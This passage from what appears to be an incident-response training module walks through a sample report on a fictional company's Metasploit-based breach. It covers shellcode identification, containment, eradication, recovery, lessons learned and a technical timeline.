![Screenshot showing a Google search for '.length,0x30000, 0x40 reflecteddelegate' with results related to Metasploit PowerShell Reflection Payload. The right side displays a PowerShell script with functions for loading assemblies and handling pointers, including base64 encoded data and IP address 192.168.220.66.](https://academy.hackthebox.com/storage/modules/238/meter_refl.png)

To support our hypothesis that `Metasploit` was used, we dived deeper into the detected shellcode. We specifically exported the packet bytes containing the shellcode (as `a.bin`) and subsequently submitted them to VirusTotal for evaluation.

![Wireshark interface showing TCP stream 49 with packet details, including source and destination IPs, protocol, and hex data. Context menu open with 'Export Packet Bytes' option highlighted.](https://academy.hackthebox.com/storage/modules/238/packets1.png)

![Hex dump of a binary file showing repeated '4141' sequences followed by varied hexadecimal values.](https://academy.hackthebox.com/storage/modules/238/packets2.png)

![VirusTotal scan result: 12/58 security vendors flagged the file as malicious, with threat labels 'shikata/metacoder'.](https://academy.hackthebox.com/storage/modules/238/packets3.png)

The results from VirusTotal affirmed our suspicion that `Metasploit` was in play. Both `metacoder` and `shikata` are intrinsically linked to the Metasploit-generated shellcode.

* * *

## Impact Analysis

In this segment, we should dive deeper into the initial stakeholder impact analysis presented at the outset of this report. Given the company's unique internal structure, business landscape, and regulatory obligations, it's crucial to offer a comprehensive evaluation of the incident's implications for every affected party.

* * *

## Response and Recovery Analysis

#### Immediate Response Actions

**Revocation of Access**

- `Identification of Compromised Accounts/Systems`: Using Elastic SIEM solution, suspicious activities associated with unauthorized access were flagged on `WKST01.samplecorp.com`. Then, a combination of traffic and log analysis uncovered unauthorized access on `HR01.samplecorp.com` as well.
- `Timeframe`: Unauthorized activities were detected at `April 22, 2019, 01:05:00`. Access was terminated by `April 22nd, 2019, 03:43:34` upon firewall rule update to block the C2 IP address.
- `Method of Revocation`: Alongside the firewall rules, Active Directory policies were applied to force log-off sessions from possibly compromised accounts. Additionally, affected user credentials were reset and accessed API keys were revoked, further inhibiting unauthorized access.
- `Impact`: Immediate revocation of access halted potential lateral movement, preventing further system compromise and data exfiltration attempts.

**Containment Strategy**

- `Short-term Containment`: As part of the initial response, VLAN segmentation was promptly applied, effectively isolating `WKST01.samplecorp.com` and `HR01.samplecorp.com` from the rest of the network, and hindering any lateral movement by the threat actor.
- `Long-term Containment`: The next phase of containment involves a more robust implementation of network segmentation, ensuring specific departments or critical infrastructure run on isolated network segments, and robust network access controls, ensuring that only authorized devices have access to an organization's internal network. Both would reduce the attack surface for future threats.
- `Effectiveness`: The containment strategies were successful in ensuring that the threat actor did not escalate privileges or move to adjacent systems, thus limiting the incident's impact.

#### Eradication Measures

**Malware Removal**

- `Identification`: Suspicious processes were flagged on the compromised systems, and a deep dive forensic examination revealed traces of the `Metasploit` post-exploitation framework, which was further confirmed by `VirusTotal` analysis.
- `Removal Techniques`: Using a specialized malware removal tool, all identified malicious payloads were eradicated from `WKST01.samplecorp.com` and `HR01.samplecorp.com`.
- `Verification`: Post-removal, a secondary scan was initiated, and a heuristic analysis was performed to ensure no remnants of the malware persisted.

**System Patching**

- `Vulnerability Identification`: A vulnerable instance of `Acrobat Reader` was identified, leading to the initial compromise. Cross-referencing with known vulnerabilities pointed towards a potential exploit being used. A `buffer overflow` vulnerability, in a proprietary application developed by SampleCorp was also identified.
- `Patch Management`: All systems, were promptly updated to the latest version of `Acrobat Reader` that addressed the known vulnerability. The development team rolled out an emergency patch for the `buffer overflow` vulnerability in the proprietary HR application, which was then deployed to `HR01.samplecorp.com`. Patching was done in a staged manner, with critical systems prioritized.
- `Fallback Procedures`: System snapshots and configurations were backed up before the patching process, ensuring a swift rollback if the update introduced any system instabilities.

#### Recovery Steps

**Data Restoration**

- `Backup Validation`: Prior to data restoration, backup checksums were cross-verified to ensure the integrity of the backup data.
- `Restoration Process`: The SOC team meticulously restored both affected systems from validated backups.
- `Data Integrity Check` s: Post-restoration, cryptographic hashing using SHA-256 was employed to verify the integrity and authenticity of the restored data.

**System Validation**

- `Security Measures`: The systems' firewalls and intrusion detection systems were updated with the latest threat intelligence feeds, ensuring any indicators of compromise (IoCs) from this incident would trigger instant alerts.
- `Operational Checks`: Before reintroducing systems into the live environment, a battery of operational tests, including load and stress testing, was conducted to confirm the systems' stability and performance.

#### Post-Incident Actions

**Monitoring**

- `Enhanced Monitoring Plans`: The monitoring paradigm has been revamped to include behavioral analytics, focusing on spotting deviations from baseline behaviors which could indicate compromise. In addition, inventory and asset management activities commenced to facilitate the implementation of network access controls.
- `Tools and Technologies`: Leveraging the capabilities of the existing Elastic SIEM, advanced correlation rules will be implemented, specifically designed to detect the tactics, techniques, and procedures (TTPs) identified in this breach.

**Lessons Learned**

- `Gap Analysis`: The incident shed light on certain gaps, primarily around network access controls, email filtering, network segregation, and user training about potential phishing attempts with malicious documents.
- `Recommendations for Improvement`: Initiatives around inventory and asset management, email filtering, and improved security awareness training are prioritized.
- `Future Strategy`: A forward-looking strategy will involve more granular network access controls and network segmentation, adopting a zero-trust security model, and increasing investments in both security awareness training and email filtering.

* * *

## Annex A

#### Technical Timeline

| Time | Activity |
| --- | --- |
| `April 22nd, 2019, 00:27:27` | One of the employees opened a malicious PDF document ( `cv.pdf`) on `WKST01.samplecorp.com`, which exploited a known vulnerability in an outdated version of `Acrobat Reader`. This led to the execution of a malicious payload that established initial foothold on the system. |
| `April 22nd, 2019, 00:35:09` | The unauthorized entity accessed various directories on `WKST01.samplecorp.com` containing both proprietary source code and API keys. |
| `April 22nd, 2019, 00:50:18` | The unauthorized entity leveraged the initial access to perform reconnaissance on the internal network. They discovered a `buffer overflow` vulnerability in a proprietary HR application running on `HR01.samplecorp.com`. Using a crafted payload, they exploited this vulnerability to gain unauthorized access to the HR system. |
| `April 22nd, 2019, 01:30:12` | The unauthorized entity located an unencrypted database on `HR01.samplecorp.com` containing sensitive employee and partner data, including Social Security numbers and salary information. They compressed this data and exfiltrated it to an external server via a secure `SSH` tunnel. |
| `April 22nd, 2019, 02:30:11` | SampleCorp's SOC and DFIR teams detected the unauthorized activities and immediately isolated `WKST01.samplecorp.com` and `HR01.samplecorp.com` from the network using VLAN segmentation. |
| `April 22nd, 2019, 03:10:14` | SampleCorp's SOC and DFIR teams plugged a host security solution to both `WKST01.samplecorp.com` and `HR01.samplecorp.com` to collect more data from the affected systems. |
| `April 22nd, 2019, 03:43:34` | The firewall rules were updated to block the known C2 IP address, effectively cutting off the unauthorized entity's remote access. |
| `April 22nd, 2019, 04:11:00` | A specialized malware removal tool was used to clean both `WKST01.samplecorp.com` and `HR01.samplecorp.com` of the deployed malware. |
| `April 22nd, 2019, 04:30:00` | All systems, starting with `WKST01.samplecorp.com` were updated to the latest version of `Acrobat Reader`, mitigating the vulnerability that led to the initial compromise. |
| `April 22nd, 2019, 05:01:08` | The API keys that were accessed by the unauthorized entity have been revoked. |
| `April 22nd, 2019, 05:05:08` | The login credentials of the user who accessed the `cv.pdf` file, as well as those of users who have recently signed into both `WKST01.samplecorp.com` and `HR01.samplecorp.com`, have been reset. |
| `April 22nd, 2019, 05:21:20` | After ensuring that `WKST01.samplecorp.com` was malware-free, the SOC team restored the system from a verified backup. |
| `April 22nd, 2019, 05:58:50` | After ensuring that `HR01.samplecorp.com` was malware-free, the SOC team restored the system from a verified backup. |
| `April 22nd, 2019, 06:33:44` | The development team rolled out an emergency patch for the `buffer overflow` vulnerability in the proprietary HR application, which was then deployed to `HR01.samplecorp.com`. |


